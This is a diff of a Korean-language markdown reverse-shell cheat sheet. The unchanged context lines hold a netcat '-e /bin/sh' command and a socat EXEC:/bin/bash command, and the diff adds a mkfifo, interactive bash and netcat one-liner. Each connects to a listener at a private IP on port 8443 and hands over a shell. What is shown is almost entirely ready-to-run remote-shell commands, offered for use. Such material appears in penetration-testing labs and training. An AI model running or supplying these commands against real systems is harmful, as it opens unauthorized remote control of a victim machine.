@@ -11,6 +11,9 @@
 ### 클라이언트 - nc를 사용하여 연결
 ```nc -e /bin/sh 10.0.3.4 8443```
 
+### 클라이언트 - Bash 셸과 nc 세션을 사용하여 연결
+```rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.0.3.4 8443 > /tmp/f```<br/>
+
 ### 클라이언트 - socat을 사용하여 연결
 ```socat TCP4:10.10.3.4:8443 EXEC:/bin/bash```
 
